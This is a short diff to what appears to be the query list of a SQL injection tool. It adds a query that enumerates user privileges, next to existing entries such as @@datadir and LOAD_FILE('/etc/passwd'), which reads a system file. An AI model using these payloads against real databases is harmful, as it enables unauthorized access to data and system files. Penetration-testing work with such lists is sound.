@@ -29,6 +29,7 @@ Regular Queries (Single-Result):
 "@@datadir"
 "schema()"
 "LOAD_FILE('/etc/passwd')"
+"group_concat(privilege_type) from information_schema.user_privileges"
 =================================================================
 
 Limit Queries (Multi-Result) -> script automatically increments (only include 'LIMIT'):
